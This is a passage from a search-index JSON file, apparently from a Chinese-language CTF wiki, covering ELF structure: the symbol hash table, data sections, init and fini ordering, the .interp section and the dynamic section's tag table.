bucket\u6570\u7ec4\u5305\u542b\u4e86nbucket\u4e2a\u5143\u7d20\uff0cchain\u6570\u7ec4\u5305\u542b\u4e86nchain\u4e2a\u5143\u7d20\uff0c\u6240\u6709\u7684\u6570\u7ec4\u7684\u4e0b\u6807\u90fd\u662f\u4ee50\u5f00\u59cb\u3002bucket\u548cchain\u90fd\u5305\u542b\u7b26\u53f7\u8868\u7d22\u5f15\u3002chain\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u662f\u548c\u7b26\u53f7\u8868\u4e2d\u7684\u5143\u7d20\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u56e0\u6b64\u7b26\u53f7\u8868\u7684\u5143\u7d20\u4e2a\u6570\u5fc5\u987b\u548cnchain\u7684\u5927\u5c0f\u76f8\u540c\uff0c\u6545\u800c\u7b26\u53f7\u8868\u7684\u7d22\u5f15\u540c\u6837\u53ef\u4ee5\u4f5c\u4e3achain\u8868\u7684\u7d22\u5f15\u3002\u4e0b\u9762\u5c55\u793a\u7684\u54c8\u5e0c\u51fd\u6570\u63a5\u53d7\u4e00\u4e2a\u7b26\u53f7\u540d\u4f5c\u4e3a\u8f93\u5165\uff0c\u7136\u540e\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u8fd9\u4e2a\u503c\u53ef\u80fd\u88ab\u7528\u4e8e\u8ba1\u7b97bucket\u7684\u7d22\u5f15\u3002\u56e0\u6b64\uff0c\u5982\u679c\u54c8\u5e0c\u51fd\u6570\u9488\u5bf9\u4e8e\u67d0\u4e2a\u540d\u5b57\u8fd4\u56de\u503cx\uff0c\u90a3\u4e48 bucket[x%nbucket] \u7ed9\u51fa\u4e86\u4e00\u4e2a\u7d22\u5f15y\uff0c\u53ef\u4ee5\u7528\u6765\u7d22\u5f15\u7b26\u53f7\u8868\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u7d22\u5f15chain\u8868\u3002\u5982\u679c\u7b26\u53f7\u8868\u7684\u5bf9\u5e94\u7d22\u5f15\u5e76\u4e0d\u662f\u6240\u60f3\u8981\u7684\u54ea\u4e00\u4e2a\uff0c\u90a3\u4e48chain[y]\u5c31\u4f1a\u7ed9\u51fa\u7ed9\u51fa\u540c\u4e00\u4e2a\u54c8\u5e0c\u503c\u7684\u4e0b\u4e00\u4e2a\u7b26\u53f7\u8868\u4e2d\u8868\u9879\u7684\u4f4d\u7f6e\uff0c\u5373\u53ef\u4ee5\u7528\u6765\u9632\u6b62\u51fa\u73b0\u54c8\u5e0c\u503c\u4e00\u6837\u7684\u60c5\u51b5\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u8ddf\u7740chain\u94fe\u4e00\u76f4\u641c\u7d22\u76f4\u5230\u9047\u5230\u6240\u60f3\u8981\u7684\u7b26\u53f7\uff0c\u6216\u8005\u9047\u5230\u503c\u4e3a STN_UNDEF \u7684chain\u7684\u8868\u9879\u3002","title":"ELF \u6807\u51c6"},{"location":"executable/elf/elf_structure/#data-related-sections","text":"","title":"Data Related Sections"},{"location":"executable/elf/elf_structure/#bss-section","text":"\u672a\u521d\u59cb\u5316\u7684\u5168\u5c40\u53d8\u91cf\u5bf9\u5e94\u7684\u8282\u3002\u6b64\u8282\u533a\u4e0d\u5360\u7528 ELF \u6587\u4ef6\u7a7a\u95f4\uff0c\u4f46\u5360\u7528\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u4e2d\u7684\u7a7a\u95f4\u3002\u5f53\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u5c06\u628a\u8fd9\u4e9b\u6570\u636e\u521d\u59cb\u5316\u4e3a 0\u3002bss\u5176\u5b9e\u662fblock started by symbol\u7684\u7b80\u5199\uff0c\u8bf4\u660e\u8be5\u8282\u533a\u4e2d\u5355\u7eaf\u5730\u8bf4\u660e\u4e86\u6709\u54ea\u4e9b\u53d8\u91cf\u3002","title":"BSS Section"},{"location":"executable/elf/elf_structure/#data-section","text":"\u8fd9\u4e9b\u8282\u533a\u5305\u542b\u521d\u59cb\u5316\u4e86\u7684\u6570\u636e\uff0c\u4f1a\u5728\u7a0b\u5e8f\u7684\u5185\u5b58\u6620\u50cf\u4e2d\u51fa\u73b0\u3002","title":".data Section"},{"location":"executable/elf/elf_structure/#rodata-section","text":"\u8fd9\u4e9b\u8282\u533a\u5305\u542b\u53ea\u8bfb\u6570\u636e\uff0c\u8fd9\u4e9b\u6570\u636e\u901a\u5e38\u53c2\u4e0e\u8fdb\u7a0b\u6620\u50cf\u7684\u4e0d\u53ef\u5199\u6bb5\u3002","title":".rodata Section"},{"location":"executable/elf/elf_structure/#common-code-section","text":"","title":"Common Code Section"},{"location":"executable/elf/elf_structure/#_15","text":"\u5728\u52a8\u6001\u94fe\u63a5\u5668\u521b\u5efa\u4e86\u8fdb\u7a0b\u955c\u50cf\uff0c\u5e76\u4e14\u6267\u884c\u4e86\u91cd\u5b9a\u4f4d\u540e\uff0c\u6bcf\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u673a\u4f1a\u53bb\u6267\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u7684\u4ee3\u7801\u3002\u6240\u6709\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4f1a\u5728\u53ef\u6267\u884c\u6587\u4ef6\u83b7\u5f97\u6743\u9650\u4e4b\u524d\u8fdb\u884c\u521d\u59cb\u5316\u3002 \u5728\u8c03\u7528\u76ee\u6807\u6587\u4ef6 A \u7684\u521d\u59cb\u5316\u4ee3\u7801\u4e4b\u524d\uff0c\u4f1a\u9996\u5148\u8c03\u7528\u6240\u6709 A \u4f9d\u8d56\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u521d\u59cb\u5316\u4ee3\u7801\u3002\u6bd4\u5982\u8bf4\uff0c\u5982\u679c\u76ee\u6807\u6587\u4ef6 A \u4f9d\u8d56\u4e8e\u53e6\u5916\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6 B\uff0c\u90a3\u4e48 B \u5c31\u4f1a\u5728 A \u7684\u4f9d\u8d56\u5217\u8868\u4e2d\uff0c\u8fd9\u4f1a\u88ab\u8bb0\u5f55\u5728\u52a8\u6001\u7ed3\u6784\u7684 DT_NEEDED \u4e2d\u3002\u5faa\u73af\u4f9d\u8d56\u7684\u521d\u59cb\u5316\u662f\u672a\u88ab\u5b9a\u4e49\u7684\u3002 \u76ee\u6807\u6587\u4ef6\u7684\u521d\u59cb\u5316\u901a\u8fc7\u9012\u5f52\u6bcf\u4e00\u4e2a\u88ab\u4f9d\u8d56\u7684\u8868\u9879\u6765\u5b8c\u6210\u3002\u53ea\u6709\u5f53\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u4f9d\u8d56\u7684\u6240\u6709\u7684\u76ee\u6807\u6587\u4ef6\u90fd\u5904\u7406\u5b8c\u81ea\u5df1\u7684\u4f9d\u8d56\u540e\uff0c\u8fd9\u4e2a\u76ee\u6807\u6587\u4ef6\u624d\u4f1a\u6267\u884c\u521d\u59cb\u5316\u4ee3\u7801\u3002 \u4e0b\u9762\u7684\u4f8b\u5b50\u89e3\u91ca\u4e86\u4e24\u79cd\u6b63\u786e\u7684\u53ef\u4ee5\u7528\u6765\u751f\u6210\u7ed9\u5b9a\u4f8b\u5b50\u7684\u987a\u5e8f\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0ca.out \u4f9d\u8d56\u4e8eb\uff0cd \u4ee5\u53ca e\u3002b\u4f9d\u8d56\u4e8ed \u548c f\uff0c\u5e76\u4e14 d \u4f9d\u8d56\u4e8e e \u548c g\u3002\u6839\u636e\u8fd9\u4e2a\u4fe1\u606f\uff0c\u6211\u4eec\u53ef\u4ee5\u753b\u51fa\u5982\u4e0b\u7684\u4f9d\u8d56\u56fe\u3002\u90a3\u4e48\u6211\u4eec\u4e0a\u9762\u6240\u8bf4\u7684\u7b97\u6cd5\uff0c\u5c06\u5141\u8bb8\u6211\u4eec\u6309\u7167\u5982\u4e0b\u7684\u987a\u5e8f\u8fdb\u884c\u521d\u59cb\u5316\u3002 \u7c7b\u4f3c\u7684\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e5f\u4f1a\u6709\u7ed3\u675f\u7684\u51fd\u6570\uff0c\u8fd9\u4e9b\u51fd\u6570\u5728\u8fdb\u7a0b\u5b8c\u6210\u81ea\u5df1\u7684\u7ec8\u6b62\u5e8f\u5217\u65f6\u901a\u8fc7 atexit \u673a\u5236\u6765\u6267\u884c\u3002\u52a8\u6001\u94fe\u63a5\u5668\u8c03\u7528\u7ec8\u6b62\u51fd\u6570\u7684\u987a\u5e8f\u6070\u597d\u4e0e\u4e0a\u9762\u521d\u59cb\u5316\u7684\u987a\u5e8f\u76f8\u53cd\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4f1a\u786e\u4fdd\u5b83\u53ea\u4f1a\u6267\u884c\u521d\u59cb\u5316\u6216\u8005\u7ec8\u6b62\u51fd\u6570\u6700\u591a\u4e00\u6b21\u3002 \u5171\u4eab\u76ee\u6807\u6587\u4ef6\u901a\u8fc7\u52a8\u6001\u7ed3\u6784\u4e2d\u7684 DT_INIT \u548c DT_FINI \u6765\u6307\u5b9a\u5b83\u4eec\u7684\u521d\u59cb\u5316\u4ee5\u53ca\u7ed3\u675f\u51fd\u6570\u3002\u5728\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u8fd9\u4e9b\u51fd\u6570\u5728.init\u8282\u4e0e.fini\u8282\u4e2d\u3002 \u6ce8\u610f\uff1a \u5c3d\u7ba1ateixt\u7ec8\u6b62\u5904\u7406\u51fd\u6570\u901a\u5e38\u6765\u8bf4\u4f1a\u88ab\u6267\u884c\uff0c\u4f46\u5b83\u5e76\u4e0d\u4f1a\u4fdd\u8bc1\u5728\u7a0b\u5e8f\u6d88\u4ea1\u65f6\u88ab\u6267\u884c\u3002\u66f4\u7279\u6b8a\u7684\u662f\uff0c\u5982\u679c\u7a0b\u5e8f\u8c03\u7528\u4e86_exit\u51fd\u6570\u6216\u8005\u8fdb\u7a0b\u7531\u4e8e\u63a5\u6536\u5230\u4e00\u4e2a\u4fe1\u53f7\u540e\u6d88\u4ea1\u4e86\uff0c\u90a3\u4e48\u5b83\u5c06\u4e0d\u4f1a\u6267\u884c\u5bf9\u5e94\u7684\u51fd\u6570\u3002 \u52a8\u6001\u94fe\u63a5\u5668\u5e76\u4e0d\u8d1f\u8d23\u8c03\u7528\u53ef\u6267\u884c\u6587\u4ef6\u7684 .init \u8282\u6216\u8005\u5229\u7528 atexit \u6ce8\u518c\u53ef\u6267\u884c\u6587\u4ef6\u7684 .fini \u8282\u3002\u7531\u7528\u6237\u901a\u8fc7 atexit \u673a\u5236\u6307\u5b9a\u7684\u7ec8\u6b62\u51fd\u6570\u5fc5\u987b\u5728\u6240\u6709\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u7ed3\u675f\u51fd\u6570\u524d\u6267\u884c\u3002","title":"\u6982\u8ff0"},{"location":"executable/elf/elf_structure/#init-init_array","text":"\u6b64\u8282\u533a\u5305\u542b\u53ef\u6267\u884c\u6307\u4ee4\uff0c\u662f\u8fdb\u7a0b\u521d\u59cb\u5316\u4ee3\u7801\u7684\u4e00\u90e8\u5206\u3002\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u5728\u5f00\u59cb\u8c03\u7528\u4e3b\u7a0b\u5e8f\u5165\u53e3\uff08\u901a\u5e38\u6307 C \u8bed\u8a00\u7684 main \u51fd\u6570\uff09\u524d\u6267\u884c\u8fd9\u4e9b\u4ee3\u7801\u3002","title":".init &amp; .init_array"},{"location":"executable/elf/elf_structure/#text","text":"\u6b64\u8282\u533a\u5305\u542b\u7a0b\u5e8f\u7684\u53ef\u6267\u884c\u6307\u4ee4\u3002","title":".text"},{"location":"executable/elf/elf_structure/#fini-fini_array","text":"\u6b64\u8282\u533a\u5305\u542b\u53ef\u6267\u884c\u7684\u6307\u4ee4\uff0c\u662f\u8fdb\u7a0b\u7ec8\u6b62\u4ee3\u7801\u7684\u4e00\u90e8\u5206\u3002\u7a0b\u5e8f\u6b63\u5e38\u9000\u51fa\u65f6\uff0c\u7cfb\u7edf\u5c06\u6267\u884c\u8fd9\u91cc\u7684\u4ee3\u7801\u3002","title":".fini &amp; .fini_array"},{"location":"executable/elf/elf_structure/#dynamic-related-sections","text":"","title":"Dynamic Related Sections"},{"location":"executable/elf/elf_structure/#interp-section","text":"\u4e00\u822c\u6765\u8bf4\uff0c\u53ef\u6267\u884c\u6587\u4ef6\u5177\u6709\u4e00\u4e2a PT_INTERP \u7c7b\u578b\u7684\u7a0b\u5e8f\u5934\u5143\u7d20\uff0c\u4ee5\u4fbf\u4e8e\u6765\u52a0\u8f7d\u7a0b\u5e8f\u4e2d\u7684\u6bb5\u3002\u8fd9\u4e2a\u8282\u5305\u542b\u4e86\u7a0b\u5e8f\u5bf9\u5e94\u7684\u89e3\u91ca\u5668\u3002\u5728 exec (BA_OS) \u8fc7\u7a0b\u4e2d\uff0c\u7cfb\u7edf\u4f1a\u4ece\u8be5\u8282\u4e2d\u63d0\u53d6\u5bf9\u5e94\u89e3\u91ca\u5668\u7684\u8def\u5f84\uff0c\u5e76\u6839\u636e\u89e3\u91ca\u5668\u6587\u4ef6\u7684\u6bb5\u521b\u5efa\u521d\u59cb\u65f6\u7684\u7a0b\u5e8f\u955c\u50cf\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u7cfb\u7edf\u5e76\u4e0d\u4f7f\u7528\u7ed9\u5b9a\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u955c\u50cf\uff0c\u800c\u4f1a\u9996\u5148\u4e3a\u89e3\u91ca\u5668\u6784\u9020\u72ec\u7acb\u7684\u5185\u5b58\u955c\u50cf\u3002\u56e0\u6b64\uff0c\u89e3\u91ca\u5668\u9700\u8981\u4ece\u7cfb\u7edf\u5904\u83b7\u53d6\u63a7\u5236\u6743\uff0c\u7136\u540e\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u6267\u884c\u73af\u5883\u3002 \u89e3\u91ca\u5668\u53ef\u80fd\u6709\u4e24\u79cd\u65b9\u5f0f\u83b7\u53d6\u63a7\u5236\u6743\u3002 \u5b83\u53ef\u4ee5\u63a5\u6536\u4e00\u4e2a\u6307\u5411\u6587\u4ef6\u5934\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u4ee5\u4fbf\u4e8e\u8bfb\u53d6\u53ef\u6267\u884c\u6587\u4ef6\u3002\u5b83\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26\u6765\u8bfb\u53d6\u5e76\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6bb5\u6620\u5c04\u5230\u5185\u5b58\u4e2d\u3002 \u6709\u65f6\u5019\u6839\u636e\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\u7684\u4e0d\u540c\uff0c\u7cfb\u7edf\u6709\u53ef\u80fd\u4e0d\u4f1a\u628a\u6587\u4ef6\u63cf\u8ff0\u7b26\u7ed9\u89e3\u91ca\u5668\uff0c\u800c\u662f\u4f1a\u76f4\u63a5\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u3002\u867d\u7136\u6587\u4ef6\u63cf\u8ff0\u7b26\u53ef\u80fd\u4f1a\u51fa\u73b0\u5f02\u5e38\uff0c\u4f46\u662f\u89e3\u91ca\u5668\u7684\u521d\u59cb\u72b6\u6001\u4ecd\u7136\u4f1a\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u7684\u6536\u5230\u7684\u76f8\u5339\u914d\uff0c\u89e3\u91ca\u5668\u672c\u8eab\u4e0d\u9700\u8981\u518d\u6709\u4e00\u4e2a\u89e3\u91ca\u5668\u3002\u89e3\u91ca\u5668\u672c\u8eab\u53ef\u80fd\u662f\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u6216\u8005\u662f\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u3002 \u9700\u8981\u6ce8\u610f\u4ee5\u4e0b\u95ee\u9898 \u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08\u6b63\u5e38\u60c5\u51b5\u4e0b\uff09\u88ab\u52a0\u8f7d\u4e3a\u5730\u5740\u72ec\u7acb\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5bf9\u4e8e\u4e0d\u540c\u7684\u8fdb\u7a0b\u6765\u8bf4\uff0c\u5b83\u7684\u5730\u5740\u4f1a\u6709\u6240\u4e0d\u540c\u3002\u7cfb\u7edf\u901a\u8fc7 mmap (KE_OS) \u4ee5\u53ca\u4e00\u4e9b\u76f8\u5173\u7684\u64cd\u4f5c\u6765\u521b\u5efa\u52a8\u6001\u6bb5\u4e2d\u7684\u5185\u5bb9\u3002\u56e0\u6b64\uff0c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u5730\u5740\u901a\u5e38\u6765\u8bf4\u4e0d\u4f1a\u548c\u539f\u6765\u7684\u53ef\u6267\u884c\u6587\u4ef6\u7684\u539f\u6709\u5730\u5740\u51b2\u7a81\u3002 \u53ef\u6267\u884c\u6587\u4ef6\u4e00\u822c\u4f1a\u88ab\u52a0\u8f7d\u5230\u56fa\u5b9a\u7684\u5730\u5740\u3002\u7cfb\u7edf\u901a\u8fc7\u7a0b\u5e8f\u5934\u90e8\u8868\u7684\u865a\u62df\u5730\u5740\u6765\u521b\u5efa\u5bf9\u5e94\u7684\u6bb5\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u7684\u89e3\u91ca\u5668\u7684\u865a\u62df\u5730\u5740\u53ef\u80fd\u548c\u7b2c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u51b2\u7a81\u3002\u89e3\u91ca\u5668\u6709\u8d23\u4efb\u6765\u89e3\u51b3\u76f8\u5e94\u7684\u51b2\u7a81\u3002","title":".interp section"},{"location":"executable/elf/elf_structure/#dynamic","text":"\u5982\u679c\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u53c2\u4e0e\u5230\u52a8\u6001\u94fe\u63a5\u7684\u8fc7\u7a0b\u4e2d\uff0c\u90a3\u4e48\u5b83\u7684\u7a0b\u5e8f\u5934\u90e8\u8868\u5c06\u4f1a\u5305\u542b\u4e00\u4e2a\u7c7b\u578b\u4e3a PT_DYNAMIC \u7684\u5143\u7d20\u3002\u8fd9\u4e2a\u6bb5\u5305\u542b\u4e86 .dynamic \u8282\uff0c\u5176\u5b9e\u8fd9\u4e2a\u6bb5\u5c31\u662f\u4e00\u4e2a\u5355\u7eaf\u7684\u952e\u503c\u5bf9\u3002 \u52a8\u6001\u8282\u4e00\u822c\u4fdd\u5b58\u4e86 ELF \u6587\u4ef6\u7684\u5982\u4e0b\u4fe1\u606f \u4f9d\u8d56\u4e8e\u54ea\u4e9b\u52a8\u6001\u5e93 \u52a8\u6001\u7b26\u53f7\u8282\u4fe1\u606f \u52a8\u6001\u5b57\u7b26\u4e32\u8282\u4fe1\u606f \u6211\u4eec\u4e00\u822c\u4f7f\u7528 _DYNAMIC \u7b26\u53f7\u6765\u6807\u8bb0\u8fd9\u4e2a\u8282\uff0c\u5b83\u7684\u7ed3\u6784\u5982\u4e0b typedef struct { Elf32_Sword d_tag; union { Elf32_Word d_val; Elf32_Addr d_ptr; } d_un; } Elf32_Dyn; extern Elf32_Dyn_DYNAMIC[]; \u5176\u4e2d\uff0cd_tag \u7684\u53d6\u503c\u51b3\u5b9a\u4e86\u8be5\u5982\u4f55\u89e3\u91ca d_un\u3002 d_val \u8fd9\u4e2a\u5b57\u6bb5\u8868\u793a\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u53ef\u4ee5\u6709\u591a\u79cd\u610f\u601d\u3002 d_ptr \u8fd9\u4e2a\u5b57\u6bb5\u8868\u793a\u7a0b\u5e8f\u7684\u865a\u62df\u5730\u5740\u3002\u6b63\u5982\u4e4b\u524d\u6240\u8bf4\u7684\uff0c\u4e00\u4e2a\u6587\u4ef6\u7684\u865a\u62df\u5730\u5740\u5728\u6267\u884c\u7684\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u548c\u5185\u5b58\u7684\u865a\u62df\u5730\u5740\u4e0d\u5339\u914d\u3002\u5f53\u89e3\u6790\u52a8\u6001\u7ed3\u6784\u4e2d\u7684\u5730\u5740\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u6839\u636e\u539f\u59cb\u6587\u4ef6\u7684\u503c\u4ee5\u53ca\u5185\u5b58\u7684\u57fa\u5730\u5740\u6765\u8ba1\u7b97\u771f\u6b63\u7684\u5730\u5740\u3002\u4e3a\u4e86\u4fdd\u6301\u4e00\u81f4\u6027\uff0c\u6587\u4ef6\u4e2d\u5e76\u4e0d\u4f1a\u5305\u542b\u91cd\u5b9a\u4f4d\u5165\u53e3\u6765\"\u7ea0\u6b63\"\u52a8\u6001\u7ed3\u6784\u4e2d\u7684\u5730\u5740\u3002 \u4e0b\u8868\u603b\u7ed3\u4e86\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u4e2d\u7684 d_tag \u7684\u9700\u6c42 \u3002\u5982\u679c\u4e00\u4e2a tag \u88ab\u6807\u8bb0\u4e3a\"mandatory\"\uff0c\u90a3\u4e48\u5bf9\u4e8e\u4e00\u4e2a TIS ELF conforming \u7684\u6587\u4ef6\u6765\u8bf4\uff0c\u5176\u52a8\u6001\u94fe\u63a5\u6570\u7ec4\u5fc5\u987b\u5305\u542b\u5bf9\u5e94\u5165\u53e3\u7684\u7c7b\u578b\u3002\u540c\u6837\u7684\uff0c\u201coptional\u201d\u610f\u5473\u7740\u53ef\u4ee5\u6709\uff0c\u4e5f\u53ef\u4ee5\u6709\u6ca1\u6709\u3002 \u540d\u79f0 \u6570\u503c d_un \u53ef\u6267\u884c \u5171\u4eab \u76ee\u6807 \u8bf4\u660e DT_NULL 0 \u5ffd\u7565 \u5fc5\u9700 \u5fc5\u9700 \u6807\u5fd7\u7740 _DYNAMIC \u6570\u7ec4\u7684\u672b\u7aef\u3002 DT_NEEDED 1 d_val \u53ef\u9009 \u53ef\u9009 \u5305\u542b\u4ee5NULL \u7ed3\u5c3e\u7684\u5b57\u7b26\u4e32\u7684\u5b57\u7b26\u4e32\u8868\u504f\u79fb\uff0c\u8be5\u5b57\u7b26\u4e32\u7ed9\u51fa\u67d0\u4e2a\u9700\u8981\u7684\u5e93\u7684\u540d\u79f0\u3002\u6240\u4f7f\u7528\u7684\u7d22\u5f15\u4e3aDT_STRTAB\u7684\u4e0b\u6807\u3002\u52a8\u6001\u6570\u7ec4\u4e2d\u53ef\u4ee5\u5305\u542b\u5f88\u591a\u4e2a\u8fd9\u79cd\u7c7b\u578b\u7684\u6807\u8bb0\u3002\u8fd9\u4e9b\u9879\u5728\u8fd9\u79cd\u7c7b\u578b\u6807\u8bb0\u4e2d\u7684\u76f8\u5bf9\u987a\u5e8f\u6bd4\u8f83\u91cd\u8981\u3002\u4f46\u662f\u4e0e\u5176\u5b83\u7684\u6807\u8bb0\u4e4b\u524d\u7684\u987a\u5e8f\u5012\u65e0\u6240\u8c13\u3002\u5bf9\u5e94\u7684\u6bb5\u4e3a.gnu.version_r\u3002 DT_PLTRELSZ 2 d_val \u53ef\u9009 \u53ef\u9009 \u7ed9\u51fa\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u76f8\u5173\u7684\u91cd\u5b9a\u4f4d\u9879\u7684\u603b\u7684\u5927\u5c0f\u3002\u5982\u679c\u5b58\u5728DT_JMPREL\u7c7b\u578b\u7684\u9879\uff0c\u90a3\u4e48DT_PLTRELSZ\u4e5f\u5fc5\u987b\u5b58\u5728\u3002 DT_PLTGOT 3 d_ptr \u53ef\u9009 \u53ef\u9009 \u7ed9\u51fa\u4e0e\u8fc7\u7a0b\u94fe\u63a5\u8868\u6216\u8005\u5168\u5c40\u504f\u79fb\u8868\u76f8\u5173\u8054\u7684\u5730\u5740\uff0c\u5bf9\u5e94\u7684\u6bb5.got.plt DT_HASH 4 d_ptr \u5fc5\u9700 \u5fc5\u9700 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u7b26\u53f7\u54c8\u5e0c\u8868\u7684\u5730\u5740\u3002\u6b64\u54c8\u5e0c\u8868\u6307\u7684\u662f\u88ab DT_SYMTAB \u5f15\u7528\u7684\u7b26\u53f7\u8868\u3002 DT_STRTAB 5 d_ptr \u5fc5\u9700 \u5fc5\u9700 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u52a8\u6001\u5b57\u7b26\u4e32\u8868\u7684\u5730\u5740\u3002\u7b26\u53f7\u540d\u3001\u5e93\u540d\u3001\u548c\u5176\u5b83\u5b57\u7b26\u4e32\u90fd\u5305\u542b\u5728\u6b64\u8868\u4e2d\u3002\u5bf9\u5e94\u7684\u8282\u7684\u540d\u5b57\u5e94\u8be5\u662f.dynstr\u3002 DT_SYMTAB 6 d_ptr \u5fc5\u9700 \u5fc5\u9700 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u52a8\u6001\u7b26\u53f7\u8868\u7684\u5730\u5740\u3002\u5bf9 32 \u4f4d\u7684\u6587\u4ef6\u800c\u8a00\uff0c\u8fd9\u4e2a\u7b26\u53f7\u8868\u4e2d\u7684\u6761\u76ee\u7684\u7c7b\u578b\u4e3a Elf32_Sym\u3002 DT_RELA 7 d_ptr \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b\u91cd\u5b9a\u4f4d\u8868\u7684\u5730\u5740\u3002\u6b64\u8868\u4e2d\u7684\u5143\u7d20\u5305\u542b\u663e\u5f0f\u7684\u8865\u9f50\uff0c\u4f8b\u5982 32 \u4f4d\u6587\u4ef6\u4e2d\u7684 Elf32_Rela\u3002\u76ee\u6807\u6587\u4ef6\u53ef\u80fd\u6709\u591a\u4e2a\u91cd\u5b9a\u4f4d\u8282\u533a\u3002\u5728\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u521b\u5efa\u91cd\u5b9a\u4f4d\u8868\u65f6\uff0c\u94fe\u63a5\u7f16\u8f91\u5668\u5c06\u8fd9\u4e9b\u8282\u533a\u8fde\u63a5\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u4e2a\u8868\u3002\u5c3d\u7ba1\u5728\u76ee\u6807\u6587\u4ef6\u4e2d\u8fd9\u4e9b\u8282\u533a\u76f8\u4e92\u72ec\u7acb\uff0c\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u628a\u5b83\u4eec\u89c6\u4e3a\u4e00\u4e2a\u8868\u3002\u5728\u52a8\u6001\u94fe\u63a5\u5668\u4e3a\u53ef\u6267\u884c\u6587\u4ef6\u521b\u5efa\u8fdb\u7a0b\u6620\u50cf\u6216\u8005\u5411\u4e00\u4e2a\u8fdb\u7a0b\u6620\u50cf\u4e2d\u6dfb\u52a0\u67d0\u4e2a\u5171\u4eab\u76ee\u6807\u65f6\uff0c\u8981\u8bfb\u53d6\u91cd\u5b9a\u4f4d\u8868\u5e76\u6267\u884c\u76f8\u5173\u7684\u52a8\u4f5c\u3002\u5982\u679c\u6b64\u5143\u7d20\u5b58\u5728\uff0c\u52a8\u6001\u7ed3\u6784\u4f53\u4e2d\u4e5f\u5fc5\u987b\u5305\u542b DT_RELASZ \u548c DT_RELAENT \u5143\u7d20\u3002\u5982\u679c\u5bf9\u4e8e\u67d0\u4e2a\u6587\u4ef6\u6765\u8bf4\uff0c\u91cd\u5b9a\u4f4d\u662f\u5fc5\u9700\u7684\u8bdd\uff0c\u90a3\u4e48 DT_RELA \u6216\u8005 DT_REL \u90fd\u53ef\u80fd\u5b58\u5728\u3002 DT_RELASZ 8 d_val \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_RELA \u91cd\u5b9a\u4f4d\u8868\u7684\u603b\u5b57\u8282\u5927\u5c0f\u3002 DT_RELAENT 9 d_val \u5fc5\u9700 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u5305\u542b DT_RELA \u91cd\u5b9a\u4f4d\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002 DT_STRSZ 10 d_val \u5fc5\u9700 \u5fc5\u9700 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u5b57\u7b26\u4e32\u8868\u7684\u5b57\u8282\u5927\u5c0f\uff0c\u6309\u5b57\u8282\u6570\u8ba1\u7b97\u3002 DT_SYMENT 11 d_val \u5fc5\u9700 \u5fc5\u9700 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u7b26\u53f7\u8868\u9879\u7684\u5b57\u8282\u5927\u5c0f\u3002 DT_INIT 12 d_ptr \u53ef\u9009 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u521d\u59cb\u5316\u51fd\u6570\u7684\u5730\u5740\u3002 DT_FINI 13 d_ptr \u53ef\u9009 \u53ef\u9009 \u6b64\u7c7b\u578b\u8868\u9879\u7ed9\u51fa\u7ed3\u675f\u51fd\u6570\uff08Termination Function\uff09\u7684\u5730\u5740\u3002 DT_SONAME 14 d_val \u5ffd\u7565 